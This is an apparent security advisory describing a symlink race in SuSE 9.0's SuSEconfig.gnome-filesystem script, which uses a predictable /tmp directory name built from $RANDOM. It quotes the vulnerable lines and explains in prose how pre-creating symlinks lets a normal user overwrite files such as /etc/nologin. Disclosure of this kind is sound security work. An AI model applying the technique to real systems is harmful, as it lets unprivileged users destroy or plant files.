 SuSE 9.0 - YaST script SuSEconfig.gnome-filesystem  
  
 There is a symlink problem in the 
SuSEconfig.gnome-filesystem  
 scribt. a normal user can creat and overwrite every 
file  
 on the system. This script gets executed after a 
configuration change by the  
setup tool YaST. So if you have installed gnome or 
parts of gnome check this out. 
  
  
 When this scribt gets executed by YaST after a  
 configuration change it does the following:  
  
 TEMP=/tmp/tmp.SuSEconfig.gnome-filesystem.$RANDOM  
 mkdir $TEMP  
 touch $TEMP/list  
 [...]  
 echo >$TEMP/found  
 [...]  
  
 the env variable $RANDOM includes a random number. 
in my tests  
 this number goes up from 1 to 33000. But also if it 
goes up to  
 65535 it is still vul. to a symlink attack. this is 
nearly as  
 bad as the symlink problem which has been found on 
SuSE 8.2.  
 On 8.2 a SuSEconf scribt has created a link with the 
$$ at the  
 file end.  
  
 I have used a little exploit written in C which 
creats the  
 directory "/tmp/tmp.SuSEconfig.gnome-filesystem.1" 
up to  
 33000. in every directory i have created a symlink 
to a file  
 which i want to creat or to overwrite. as the 
filename i have  
 taken the $TEMP/found and let it point to some file. 
in my test i  
 have taken the /etc/nologin- and hey- it has worked!  
  
 have phun!
